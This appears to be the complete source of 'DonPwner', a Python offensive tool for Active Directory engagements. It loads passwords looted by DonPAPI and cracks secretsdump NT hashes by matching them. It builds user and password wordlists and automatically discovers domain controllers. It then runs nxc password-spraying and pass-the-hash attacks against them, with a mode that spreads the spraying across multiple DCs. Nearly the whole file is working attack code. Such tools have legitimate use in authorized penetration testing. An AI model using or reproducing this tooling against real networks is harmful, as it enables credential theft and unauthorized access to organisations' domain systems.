#!/usr/bin/env python3
# -*- coding: utf-8-sig -*-
# Author - Mor David

import sqlite3
import argparse
import hashlib
import re
import sys
import os
import requests
import yaml
from pathlib import Path
from prettytable import PrettyTable
from urllib.parse import urlparse

# Current version
CURRENT_VERSION = "1.0.0"
VERSION_CHECK_URL = "https://mordavid.com/md_versions.yaml"

def check_for_updates(silent=False, force=False):
    """
    Check for updates from mordavid.com
    
    Args:
        silent: If True, only show update messages, not "up to date" messages
        force: If True, force check even if checked recently
    
    Returns:
        dict: Update information or None if check failed
    """
    try:
        response = requests.get(VERSION_CHECK_URL, timeout=3)
        response.raise_for_status()
        
        # Parse YAML
        data = yaml.safe_load(response.text)
        
        # Find DonPwner in the software list
        DonPwner_info = None
        for software in data.get('softwares', []):
            if software.get('name', '').lower() == 'donpwner':
                DonPwner_info = software
                break
        
        if not DonPwner_info:
            return None
        
        latest_version = DonPwner_info.get('version', '0.0.0')
        
        # Simple version comparison (assumes semantic versioning)
        if latest_version != CURRENT_VERSION:
            print(f"🔄 Update available: v{CURRENT_VERSION} → v{latest_version} | Download: {DonPwner_info.get('url', 'N/A')}\n")
            return {
                'update_available': True,
                'current_version': CURRENT_VERSION,
                'latest_version': latest_version,
                'info': DonPwner_info
            }
        else:
            if not silent:
                print(f"✅ DonPwner v{CURRENT_VERSION} is up to date\n")
            return {
                'update_available': False,
                'current_version': CURRENT_VERSION,
                'latest_version': latest_version
            }
            
    except:
        # Silent fail - no error messages for network issues
        return None

def print_banner(check_updates=True):
    """Print banner with tool information and version check"""
    banner = f"""
 █▀▄ █▀█ █▀█   █▀█ █ █ █▀█ █▀▀ █▀▄
 █ █ █ █ █ █   █▀▀ █▄█ █ █ █▀▀ █▀▄
 ▀▀  ▀▀▀ ▀ ▀   ▀   ▀ ▀ ▀ ▀ ▀▀▀ ▀ ▀
🔥 Advanced DonPAPI Analysis & Attack Tool 🎯
Version {CURRENT_VERSION} | Author: Mor David (www.mordavid.com)
"""
    print(banner)
    
    # Check for updates
    if check_updates:
        check_for_updates(silent=False)

def nt_hash(password):
    """Convert password to NT hash"""
    return hashlib.new('md4', password.encode('utf-16le')).hexdigest().upper()

def parse_username(username):
    """Parse username to extract domain and user parts"""
    if not username:
        return None, None
    
    # Check for domain\user format
    if '\\' in username:
        domain, user = username.split('\\', 1)
        return domain.strip(), user.strip()
    
    # Check for user@domain format  
    if '@' in username:
        user, domain = username.split('@', 1)
        return domain.strip(), user.strip()
    
    # Regular username
    return None, username.strip()

def load_donpapi_secrets(db_path):
    """Load secrets from donpapi database"""
    # Expand user path (~)
    expanded_path = os.path.expanduser(db_path)
    
    if not os.path.exists(expanded_path):
        print(f"❌ Error: Database file not found at {expanded_path}")
        if db_path == '~/.donpapi/donpapi.db':
            print("💡 Default path not found. Please:")
            print("   - Run donpapi to create the database first")
            print("   - Or specify custom path with --load-donpapi-db /path/to/donpapi.db")
        return []
    
    try:
        conn = sqlite3.connect(expanded_path)
        cursor = conn.cursor()
        
        # Get all secrets with username and password
        cursor.execute("""
            SELECT DISTINCT username, password 
            FROM secrets 
            WHERE username IS NOT NULL 
            AND password IS NOT NULL 
            AND username != '' 
            AND password != ''
        """)
        
        secrets = cursor.fetchall()
        conn.close()
        
        print(f"Loaded {len(secrets)} secrets from donpapi database")
        return secrets
        
    except sqlite3.Error as e:
        print(f"Database error: {e}")
        return []

def load_secretsdump(file_path):
    """Load NT hashes from secretsdump file"""
    if not os.path.exists(file_path):
        print(f"Error: Secretsdump file {file_path} not found")
        return {}
    
    nt_hashes = {}
    try:
        with open(file_path, 'r', encoding='utf-8-sig') as f:
            for line in f:
                line = line.strip()
                if ':' in line and len(line.split(':')) >= 4:
                    parts = line.split(':')
                    username = parts[0]
                    nt_hash_value = parts[3] if len(parts) > 3 else None
                    
                    if nt_hash_value and len(nt_hash_value) == 32:
                        nt_hashes[username.lower()] = nt_hash_value.upper()
        
        print(f"Loaded {len(nt_hashes)} NT hashes from secretsdump")
        return nt_hashes
        
    except Exception as e:
        print(f"Error reading secretsdump file: {e}")
        return {}

def dcsync_command(args):
    """Execute dcsync subcommand"""
    print("=== DCSYNC Analysis ===")
    
    # Load secrets from donpapi
    secrets = load_donpapi_secrets(args.load_donpapi_db)
    if not secrets:
        return
    
    # Load NT hashes from secretsdump
    nt_hashes = load_secretsdump(args.load_secretsdump)
    if not nt_hashes:
        return
    
    # Create password to NT hash mapping from donpapi
    password_to_nt = {}
    for username, password in secrets:
        password_nt = nt_hash(password)
        if password_nt not in password_to_nt:
            password_to_nt[password_nt] = []
        password_to_nt[password_nt].append((username, password))
    
    matches = []
    
    print("\nAnalyzing secretsdump users against donpapi passwords...")
    
    # Check each user from secretsdump
    for secretsdump_user, user_nt_hash in nt_hashes.items():
        if user_nt_hash in password_to_nt:
            # Found matching NT hash in donpapi passwords
            for donpapi_username, donpapi_password in password_to_nt[user_nt_hash]:
                donpapi_domain, donpapi_clean_user = parse_username(donpapi_username)
                # Also parse the secretsdump user to get its domain
                secretsdump_domain, secretsdump_clean_user = parse_username(secretsdump_user)
                
                # Use the domain from either source (prefer secretsdump domain)
                final_domain = secretsdump_domain if secretsdump_domain else donpapi_domain
                
                matches.append({
                    'secretsdump_user': secretsdump_user,
                    'nt_hash': user_nt_hash,
                    'password': donpapi_password,
                    'donpapi_username': donpapi_username,
                    'domain': final_domain,
                    'clean_user': donpapi_clean_user
                })
    
    # Display results
    if matches:
        # Group by secretsdump user to avoid duplicates
        seen_users = set()
        unique_matches = []
        for match in matches:
            if match['secretsdump_user'] not in seen_users:
                seen_users.add(match['secretsdump_user'])
                unique_matches.append(match)
        
        print(f"\n🎯 Found {len(unique_matches)} secretsdump users with known passwords:")
        
        # Create pretty table
        table = PrettyTable()
        table.field_names = ["Domain", "Secretsdump User", "Password", "NT Hash", "Found in DonPAPI"]
        table.align = "l"
        
        for match in unique_matches:
            # Parse secretsdump user to get clean username
            secretsdump_domain, secretsdump_clean_user = parse_username(match['secretsdump_user'])
            final_domain = secretsdump_domain if secretsdump_domain else match['domain']
            clean_user = secretsdump_clean_user if secretsdump_clean_user else match['secretsdump_user']
            
            table.add_row([
                final_domain if final_domain else "",
                clean_user,
                match['password'],
                match['nt_hash'][:16] + "...",  # Truncate hash for readability
                match['donpapi_username']
            ])
        
        print(table)
    else:
        print("\n❌ No secretsdump users found with known passwords from donpapi")

def extract_command(args):
    """Execute extract subcommand"""
    print("=== EXTRACT Wordlists ===")
    
    # Load secrets from donpapi
    secrets = load_donpapi_secrets(args.load_donpapi_db)
    if not secrets:
        return
    
    domains = set()
    users = set()
    passwords = set()
    user_pass_combos = set()
    
    print(f"\nProcessing {len(secrets)} secrets...")
    
    for username, password in secrets:
        domain, clean_user = parse_username(username)
        
        if domain:
            domains.add(domain)
        
        if clean_user:
            users.add(clean_user)
            user_pass_combos.add(f"{clean_user}:{password}")
        
        passwords.add(password)
    
    # Create output directory
    output_dir = Path("wordlists")
    output_dir.mkdir(exist_ok=True)
    
    # Write wordlists
    wordlists = [
        ("domains.txt", domains, "domains"),
        ("users.txt", users, "users"), 
        ("passwords.txt", passwords, "passwords"),
        ("user_pass.txt", user_pass_combos, "user:password combinations")
    ]
    
    # Create summary table
    table = PrettyTable()
    table.field_names = ["Wordlist", "Count", "Status"]
    table.align = "l"
    
    for filename, data, description in wordlists:
        if data:
            filepath = output_dir / filename
            with open(filepath, 'w', encoding='utf-8') as f:
                for item in sorted(data):
                    f.write(f"{item}\n")
            table.add_row([filename, len(data), "✅ Created"])
        else:
            table.add_row([filename, 0, "⚠️  Empty"])
    
    print("\nWordlist Summary:")
    print(table)
    print(f"\n📁 Wordlists saved to: {output_dir.absolute()}")

def create_temp_wordlists(db_path):
    """Create temporary wordlists for attack"""
    # Expand user path (~)
    expanded_path = os.path.expanduser(db_path)
    secrets = load_donpapi_secrets(expanded_path)
    if not secrets:
        return None, None
    
    users = set()
    passwords = set()
    
    for username, password in secrets:
        domain, clean_user = parse_username(username)
        if clean_user:
            users.add(clean_user)
        passwords.add(password)
    
    # Create temp directory
    temp_dir = Path("temp_attack")
    temp_dir.mkdir(exist_ok=True)
    
    user_file = temp_dir / "users.txt"
    pass_file = temp_dir / "passwords.txt"
    
    with open(user_file, 'w', encoding='utf-8') as f:
        for user in sorted(users):
            f.write(f"{user}\n")
    
    with open(pass_file, 'w', encoding='utf-8') as f:
        for password in sorted(passwords):
            f.write(f"{password}\n")
    
    return str(user_file), str(pass_file)

def discover_dcs_with_nxc(target, protocol='ldap', user_file=None, pass_file=None, username=None, password=None, hashes=None, kerberos=False, proxychains=False):
    """Discover DCs using nxc"""
    print(f"🔍 Discovering DCs on {target} using {protocol.upper()}...")
    
    # Build nxc command
    nxc_cmd = f"nxc {protocol} {target}"
    
    # Add authentication
    if hashes:
        if username:
            nxc_cmd += f" -u '{username}' -H '{hashes}'"
        elif user_file:
            nxc_cmd += f" -u {user_file} -H '{hashes}'"
        else:
            nxc_cmd += f" -u '' -H '{hashes}'"
    elif kerberos:
        nxc_cmd += " -k"
        if username:
            nxc_cmd += f" -u '{username}'"
    elif username and password:
        nxc_cmd += f" -u '{username}' -p '{password}'"
    elif user_file and pass_file:
        nxc_cmd += f" -u {user_file} -p {pass_file}"
    else:
        nxc_cmd += " -u '' -p ''"
    
    # Add flags for DC discovery
    nxc_cmd += " --dc-list"
    
    if proxychains:
        nxc_cmd = f"proxychains {nxc_cmd}"
    
    print(f"🚀 Executing: {nxc_cmd}")
    
    try:
        import subprocess
        result = subprocess.run(nxc_cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        print("\n" + "="*60)
        print("NXC DC DISCOVERY OUTPUT:")
        print("="*60)
        
        if result.stdout:
            print(result.stdout)
        
        if result.stderr:
            print("STDERR:")
            print(result.stderr)
        
        print("="*60)
        
        # Parse output to find DCs
        discovered_dcs = []
        if result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                # Look for DC list entries (format: "DC01.morlab.com = 10.0.0.1")
                if ' = ' in line and protocol.upper() in line:
                    # Extract DC name from DC list line
                    parts = line.split(' = ')
                    if len(parts) >= 2:
                        # Get the part before the '=' which contains the DC name
                        dc_line_part = parts[0].strip()
                        # Extract DC name from the line (it's usually the last part after spaces)
                        line_parts = dc_line_part.split()
                        if len(line_parts) >= 4:  # Protocol, IP, Port, DC_Name, DC_FQDN
                            dc_name = line_parts[-1]  # Last part should be the DC FQDN
                            if dc_name and dc_name not in discovered_dcs and '.' in dc_name:
                                discovered_dcs.append(dc_name)
        
        # Save discovered DCs to file
        if discovered_dcs:
            # Create wordlists directory if it doesn't exist
            wordlists_dir = Path("wordlists")
            wordlists_dir.mkdir(exist_ok=True)
            
            dc_file = wordlists_dir / "dcs.txt"
            with open(dc_file, 'w', encoding='utf-8') as f:
                for dc in discovered_dcs:
                    f.write(f"{dc}\n")
            print(f"✅ Discovered {len(discovered_dcs)} DCs and saved to {dc_file}:")
            for dc in discovered_dcs:
                print(f"   📡 {dc}")
            return discovered_dcs
        else:
            print("⚠️  No DCs discovered")
            return []
            
    except subprocess.TimeoutExpired:
        print("❌ Command timed out after 5 minutes")
        return []
    except Exception as e:
        print(f"❌ Error during DC discovery: {e}")
        return []

def attack_dcs_with_nxc(protocol='smb', user_file=None, pass_file=None, username=None, password=None, hashes=None, kerberos=False, proxychains=False, extra_args="", dc_file=None, smart_mode=False):
    """Attack discovered DCs using nxc"""
    # Determine which DC file to use
    if dc_file and os.path.exists(dc_file):
        target_file = dc_file
        print(f"🎯 Attacking DCs from custom file: {dc_file}")
    elif os.path.exists('wordlists/dcs.txt'):
        target_file = 'wordlists/dcs.txt'
        print(f"🎯 Attacking DCs from: {target_file}")
    else:
        print("❌ No DC file found. Run DC discovery first or provide --attack-dc-file.")
        return False, []
    
    print(f"📡 Protocol: {protocol.upper()}...")
    
    # Handle smart mode vs single DC mode
    if smart_mode:
        print("🧠 Smart mode: Distributing attacks across all DCs")
        return smart_attack_multiple_dcs(target_file, protocol, user_file, pass_file, username, password, hashes, kerberos, proxychains, extra_args)
    else:
        # Default: attack only the first DC
        with open(target_file, 'r', encoding='utf-8-sig') as f:
            dcs = [line.strip() for line in f if line.strip()]
        
        if not dcs:
            print("❌ No DCs found in file.")
            return False, []
        
        first_dc = dcs[0]
        print(f"🎯 Single DC mode: Attacking only first DC ({first_dc})")
        attack_target = first_dc
    
    # Build nxc command
    nxc_cmd = f"nxc {protocol} {attack_target}"
    
    # Add authentication
    if hashes:
        if username:
            nxc_cmd += f" -u '{username}' -H '{hashes}'"
        elif user_file:
            nxc_cmd += f" -u {user_file} -H '{hashes}'"
        else:
            nxc_cmd += f" -u '' -H '{hashes}'"
    elif kerberos:
        nxc_cmd += " -k"
        if username:
            nxc_cmd += f" -u '{username}'"
    elif username and password:
        nxc_cmd += f" -u '{username}' -p '{password}'"
    elif user_file and pass_file:
        nxc_cmd += f" -u {user_file} -p {pass_file}"
    else:
        nxc_cmd += " -u '' -p ''"
    
    # Add extra arguments
    if extra_args:
        nxc_cmd += f" {extra_args}"
    
    # Add continue on success by default
    if "--continue-on-success" not in nxc_cmd:
        nxc_cmd += " --continue-on-success"
    
    if proxychains:
        nxc_cmd = f"proxychains {nxc_cmd}"
    
    print(f"🚀 Executing: {nxc_cmd}")
    
    try:
        import subprocess
        result = subprocess.run(nxc_cmd, shell=True, capture_output=True, text=True, timeout=600)
        
        print("\n" + "="*60)
        print("NXC DC ATTACK OUTPUT:")
        print("="*60)
        
        if result.stdout:
            print(result.stdout)
        
        if result.stderr:
            print("STDERR:")
            print(result.stderr)
        
        print("="*60)
        
        # Count successful authentications and save to file if specified
        success_count = 0
        success_lines = []
        if result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if '[+]' in line:
                    success_count += 1
                    success_lines.append(line.strip())
        
        if success_count > 0:
            print(f"✅ Attack completed with {success_count} successful authentications!")
        else:
            print("⚠️  No successful authentications found")
        
        return success_count > 0, success_lines
        
    except subprocess.TimeoutExpired:
        print("❌ Command timed out after 10 minutes")
        return False, []
    except Exception as e:
        print(f"❌ Error during DC attack: {e}")
        return False, []

def check_dc_reachability(dc, protocol, timeout=5):
    """Check if DC is reachable using nxc"""
    import subprocess
    try:
        # Quick nxc check with timeout
        cmd = f"timeout {timeout} nxc {protocol} {dc} -u '' -p '' 2>&1"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout+2)
        
        # Check for unreachable patterns
        if result.returncode == 124:  # timeout command exit code
            return False
        if "Connection refused" in result.stdout or "Connection refused" in result.stderr:
            return False
        if "timed out" in result.stdout.lower() or "timed out" in result.stderr.lower():
            return False
        if "No route to host" in result.stdout or "No route to host" in result.stderr:
            return False
        
        # Check that we got actual valid output from nxc
        # nxc should output at least the protocol name and DC info if it connected
        output = result.stdout + result.stderr
        if not output.strip():  # No output at all = DC not responding properly
            return False
        
        # Check for valid nxc response patterns (protocol name should appear)
        protocol_upper = protocol.upper()
        if protocol_upper not in output:  # No protocol mention = invalid response
            return False
        
        # If we got here, DC responded with valid output
        return True
    except:
        return False

def smart_attack_multiple_dcs(dc_file, protocol, user_file, pass_file, username, password, hashes, kerberos, proxychains, extra_args):
    """Smart attack: distribute users across multiple DCs"""
    import subprocess
    import shutil
    
    # Read DCs
    with open(dc_file, 'r', encoding='utf-8-sig') as f:
        dcs = [line.strip() for line in f if line.strip()]
    
    if not dcs:
        print("❌ No DCs found in file.")
        return False, []
    
    # Check DC reachability
    print(f"\n🔍 Checking reachability of {len(dcs)} DCs...")
    reachable_dcs = []
    unreachable_dcs = []
    
    for dc in dcs:
        print(f"   Testing {dc}...", end=" ", flush=True)
        if check_dc_reachability(dc, protocol):
            print("✅ Reachable")
            reachable_dcs.append(dc)
        else:
            print("❌ Unreachable")
            unreachable_dcs.append(dc)
    
    if not reachable_dcs:
        print("\n❌ No reachable DCs found!")
        return False, []
    
    if unreachable_dcs:
        print(f"\n⚠️  Skipping {len(unreachable_dcs)} unreachable DCs: {', '.join(unreachable_dcs)}")
    
    print(f"✅ Found {len(reachable_dcs)} reachable DCs for attack\n")
    dcs = reachable_dcs  # Use only reachable DCs
    
    # Read users
    if not user_file:
        print("❌ User file not provided for smart mode.")
        return False, []
    
    if not os.path.exists(user_file):
        print(f"❌ User file not found: {user_file}")
        return False, []
    
    with open(user_file, 'r', encoding='utf-8-sig') as f:
        users = [line.replace('\ufeff', '').strip() for line in f if line.replace('\ufeff', '').strip()]
    
    if not users:
        print("❌ No users found in user file.")
        return False, []
    
    # Create temp directory for smart attack
    temp_dir = Path("temp_smart_attack")
    temp_dir.mkdir(exist_ok=True)
    
    # Distribute users across DCs
    users_per_dc = len(users) // len(dcs)
    remainder = len(users) % len(dcs)
    
    print(f"📊 Distributing {len(users)} users across {len(dcs)} DCs:")
    print(f"   Base users per DC: {users_per_dc}")
    if remainder > 0:
        print(f"   Extra users for first {remainder} DCs: +1 each")
    
    all_success_lines = []
    total_successes = 0
    
    for i, dc in enumerate(dcs):
        # Calculate user slice for this DC
        start_idx = i * users_per_dc + min(i, remainder)
        end_idx = start_idx + users_per_dc + (1 if i < remainder else 0)
        dc_users = users[start_idx:end_idx]
        
        if not dc_users:
            continue
        
        # Create temp user file for this DC
        dc_user_file = temp_dir / f"users_dc{i+1}.txt"
        with open(dc_user_file, 'w', encoding='utf-8') as f:
            for user in dc_users:
                # Clean BOM and other problematic characters
                clean_user = user.replace('\ufeff', '').strip()
                if clean_user:
                    f.write(f"{clean_user}\n")
        
        print(f"\n🎯 DC {i+1}/{len(dcs)}: {dc}")
        print(f"   Users assigned: {len(dc_users)} ({dc_users[0]} ... {dc_users[-1] if len(dc_users) > 1 else dc_users[0]})")
        
        # Build nxc command for this DC
        nxc_cmd = f"nxc {protocol} {dc}"
        
        # Add authentication
        if hashes:
            if username:
                nxc_cmd += f" -u '{username}' -H '{hashes}'"
            else:
                nxc_cmd += f" -u {dc_user_file} -H '{hashes}'"
        elif kerberos:
            nxc_cmd += " -k"
            if username:
                nxc_cmd += f" -u '{username}'"
        elif username and password:
            nxc_cmd += f" -u '{username}' -p '{password}'"
        elif pass_file:
            nxc_cmd += f" -u {dc_user_file} -p {pass_file}"
        else:
            nxc_cmd += f" -u {dc_user_file} -p ''"
        
        # Add extra arguments
        if extra_args:
            nxc_cmd += f" {extra_args}"
        
        # Add continue on success by default
        if "--continue-on-success" not in nxc_cmd:
            nxc_cmd += " --continue-on-success"
        
        if proxychains:
            nxc_cmd = f"proxychains {nxc_cmd}"
        
        print(f"🚀 Executing: {nxc_cmd}")
        
        try:
            result = subprocess.run(nxc_cmd, shell=True, capture_output=True, text=True, timeout=600)
            
            print(f"\n{'='*60}")
            print(f"NXC ATTACK OUTPUT - DC {i+1} ({dc}):")
            print("="*60)
            
            if result.stdout:
                print(result.stdout)
            
            if result.stderr:
                print("STDERR:")
                print(result.stderr)
            
            print("="*60)
            
            # Count successful authentications for this DC
            dc_success_count = 0
            if result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if '[+]' in line:
                        dc_success_count += 1
                        all_success_lines.append(line.strip())
            
            total_successes += dc_success_count
            print(f"✅ DC {i+1} completed with {dc_success_count} successful authentications!")
            
        except subprocess.TimeoutExpired:
            print(f"❌ Command timed out for DC {i+1}")
        except Exception as e:
            print(f"❌ Error attacking DC {i+1}: {e}")
    
    # Cleanup temp files
    try:
        shutil.rmtree(temp_dir)
        print(f"\n🧹 Cleaned up smart attack temp files")
    except Exception as e:
        print(f"⚠️  Warning: Could not cleanup smart attack temp files: {e}")
    
    print(f"\n🎯 Smart Attack Summary: {total_successes} total successful authentications across {len(dcs)} DCs")
    
    return total_successes > 0, all_success_lines

def attack_command(args):
    """Execute attack subcommand - DC Discovery & Attack"""
    if hasattr(args, 'skip_dc_detection') and args.skip_dc_detection:
        print("=== ATTACK Mode - Direct Attack (Skipping DC Detection) ===")
    else:
        print("=== ATTACK Mode - DC Discovery & Attack ===")
    
    if not hasattr(args, 'skip_dc_detection') or not args.skip_dc_detection:
        if not args.target:
            print("❌ Target is required for DC discovery")
            print("💡 Use --target <target> (e.g., 192.168.1.0/24 or domain.com)")
            print("💡 Or use --skip-dc-detection to skip discovery phase")
            return
    
    # Determine authentication method
    user_file = None
    pass_file = None
    
    if args.load_donpapi_db and not args.username and not args.hashes and not args.kerberos:
        # Only create temp wordlists for DC discovery if needed
        user_file, pass_file = create_temp_wordlists(args.load_donpapi_db)
        if not user_file:
            print("❌ Failed to create wordlists from donpapi database")
            return
        
        print(f"📝 Created temporary wordlists for DC discovery:")
        print(f"   Users: {user_file}")
        print(f"   Passwords: {pass_file}")
    
    # Step 1: Discover DCs (unless skipped)
    discovered_dcs = []
    if not (hasattr(args, 'skip_dc_detection') and args.skip_dc_detection):
        print("\n" + "="*50)
        print("STEP 1: DC DISCOVERY")
        print("="*50)
        
        discovered_dcs = discover_dcs_with_nxc(
            args.target,
            args.protocol,
            user_file,
            pass_file,
            args.username,
            args.password,
            args.hashes,
            args.kerberos,
            args.proxychains
        )
        
        if not discovered_dcs:
            print("\n❌ No DCs discovered. Cannot proceed to attack phase.")
            # Cleanup temp files
            try:
                temp_dir = Path("temp_attack")
                if temp_dir.exists():
                    import shutil
                    shutil.rmtree(temp_dir)
                    print("🧹 Cleaned up temporary files")
            except Exception as e:
                print(f"⚠️  Warning: Could not cleanup temp files: {e}")
            return
    else:
        print("\n⏭️  Skipping DC discovery phase as requested")
    
    # Step 2: Attack discovered DCs
    print("\n" + "="*50)
    print("STEP 2: DC ATTACK")
    print("="*50)
    
    # For attack phase, determine wordlists to use
    attack_user_file = None
    attack_pass_file = None
    
    # Determine wordlists for attack phase
    smart_mode = args.smart if hasattr(args, 'smart') and args.smart else False
    
    if hasattr(args, 'attack_user_file') and args.attack_user_file and hasattr(args, 'attack_pass_file') and args.attack_pass_file:
        # Use custom wordlists provided by user
        attack_user_file = args.attack_user_file
        attack_pass_file = args.attack_pass_file
        print(f"📝 Using custom wordlists for attack:")
        print(f"   Users: {attack_user_file}")
        print(f"   Passwords: {attack_pass_file}")
    elif args.load_donpapi_db and smart_mode:
        # Smart mode: create temp wordlists for distribution
        attack_user_file, attack_pass_file = create_temp_wordlists(args.load_donpapi_db)
        if attack_user_file:
            print(f"📝 Using donpapi wordlists for smart attack:")
            print(f"   Users: {attack_user_file}")
            print(f"   Passwords: {attack_pass_file}")
        else:
            print("⚠️  Failed to create wordlists for attack phase")
            return
    elif user_file and pass_file:
        # Use existing wordlists from discovery phase
        attack_user_file, attack_pass_file = user_file, pass_file
        print(f"📝 Using discovery wordlists for attack:")
        print(f"   Users: {attack_user_file}")
        print(f"   Passwords: {attack_pass_file}")
    elif os.path.exists('wordlists/users.txt') and os.path.exists('wordlists/passwords.txt'):
        # Use existing wordlists from extract command
        attack_user_file = 'wordlists/users.txt'
        attack_pass_file = 'wordlists/passwords.txt'
        print(f"📝 Using existing wordlists for attack:")
        print(f"   Users: {attack_user_file}")
        print(f"   Passwords: {attack_pass_file}")
    else:
        print("❌ No wordlists available for attack phase.")
        print("💡 Options:")
        print("   - Use --load-donpapi-db <path> to create wordlists from database")
        print("   - Use --attack-user-file <path> --attack-pass-file <path> for custom wordlists")
        print("   - Run 'extract' command first to create wordlists/users.txt and wordlists/passwords.txt")
        return
    
    attack_success, success_lines = attack_dcs_with_nxc(
        args.attack_protocol if hasattr(args, 'attack_protocol') and args.attack_protocol else args.protocol,
        attack_user_file,
        attack_pass_file,
        None,  # No single username for attack phase
        None,  # No single password for attack phase
        None,  # No hashes for attack phase
        False, # No kerberos for attack phase
        args.proxychains,
        args.extra_args if hasattr(args, 'extra_args') and args.extra_args else "",
        args.attack_dc_file if hasattr(args, 'attack_dc_file') and args.attack_dc_file else None,
        smart_mode
    )
    
    # Save successful authentications to output file
    if success_lines:
        try:
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(args.output_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"Scan Time: {timestamp}\n")
                f.write(f"{'='*60}\n")
                for line in success_lines:
                    f.write(f"{line}\n")
            print(f"💾 Successful authentications appended to: {args.output_file}")
        except Exception as e:
            print(f"⚠️  Warning: Could not save output file: {e}")
    else:
        print(f"💾 No successful authentications to save to: {args.output_file}")
    
    # Cleanup temp files (only if we created them for smart mode or discovery)
    try:
        temp_dir = Path("temp_attack")
        if temp_dir.exists() and (smart_mode or user_file):
            import shutil
            shutil.rmtree(temp_dir)
            print("\n🧹 Cleaned up temporary files")
    except Exception as e:
        print(f"⚠️  Warning: Could not cleanup temp files: {e}")

def main():
    # Parse args first to check for --no-update-check
    import sys
    check_updates = '--no-update-check' not in sys.argv
    
    # Print banner
    print_banner(check_updates=check_updates)
    
    parser = argparse.ArgumentParser(description="DonPwner - Advanced DonPAPI Analysis & Attack Tool")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # DCSYNC subcommand
    dcsync_parser = subparsers.add_parser('dcsync', help='Compare donpapi secrets with secretsdump NT hashes')
    dcsync_parser.add_argument('--load-secretsdump', required=True, help='Path to secretsdump file')
    dcsync_parser.add_argument('--load-donpapi-db', default='~/.donpapi/donpapi.db', help='Path to donpapi.db file (default: ~/.donpapi/donpapi.db)')
    
    # EXTRACT subcommand  
    extract_parser = subparsers.add_parser('extract', help='Extract wordlists from donpapi database')
    extract_parser.add_argument('--load-donpapi-db', default='~/.donpapi/donpapi.db', help='Path to donpapi.db file (default: ~/.donpapi/donpapi.db)')
    
    # ATTACK subcommand
    attack_parser = subparsers.add_parser('attack', help='Discover DCs and attack them using nxc with various authentication methods')
    attack_parser.add_argument('--target', help='Target to scan for DC discovery (e.g., 192.168.1.0/24, domain.com, or IP). Required unless --skip-dc-detection is used')
    attack_parser.add_argument('--protocol', choices=['ldap', 'smb', 'winrm', 'ssh', 'rdp'], default='ldap', help='Protocol for DC discovery (default: ldap)')
    attack_parser.add_argument('--load-donpapi-db', default='~/.donpapi/donpapi.db', help='Path to donpapi.db file (default: ~/.donpapi/donpapi.db, creates wordlists if no other auth specified)')
    attack_parser.add_argument('-u', '--username', help='Single username for authentication')
    attack_parser.add_argument('-p', '--password', help='Single password for authentication')
    attack_parser.add_argument('-H', '--hashes', help='NT hashes for pass-the-hash (format: LM:NT or :NT)')
    attack_parser.add_argument('-k', '--kerberos', action='store_true', help='Use Kerberos authentication')
    attack_parser.add_argument('--proxychains', action='store_true', help='Use proxychains before nxc command')
    attack_parser.add_argument('--attack-protocol', choices=['ldap', 'smb', 'winrm', 'ssh', 'rdp'], help='Protocol for DC attack (default: same as --protocol)')
    attack_parser.add_argument('--attack-user-file', help='Custom user wordlist file for attack phase')
    attack_parser.add_argument('--attack-pass-file', help='Custom password wordlist file for attack phase')
    attack_parser.add_argument('--attack-dc-file', help='Custom DC list file for attack phase (default: wordlists/dcs.txt)')
    attack_parser.add_argument('--extra-args', help='Extra arguments to pass to nxc attack command')
    attack_parser.add_argument('--output-file', default='success.txt', help='Output file to save successful authentications ([+] lines) (default: success.txt)')
    attack_parser.add_argument('--skip-dc-detection', action='store_true', help='Skip DC discovery phase and go directly to attack')
    attack_parser.add_argument('--smart', action='store_true', help='Smart mode: Distribute attacks across all DCs instead of attacking only the first DC')
    
    # Global arguments
    parser.add_argument('--no-update-check', action='store_true', help='Skip version update check')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'dcsync':
        dcsync_command(args)
    elif args.command == 'extract':
        extract_command(args)
    elif args.command == 'attack':
        attack_command(args)

if __name__ == "__main__":
    main()
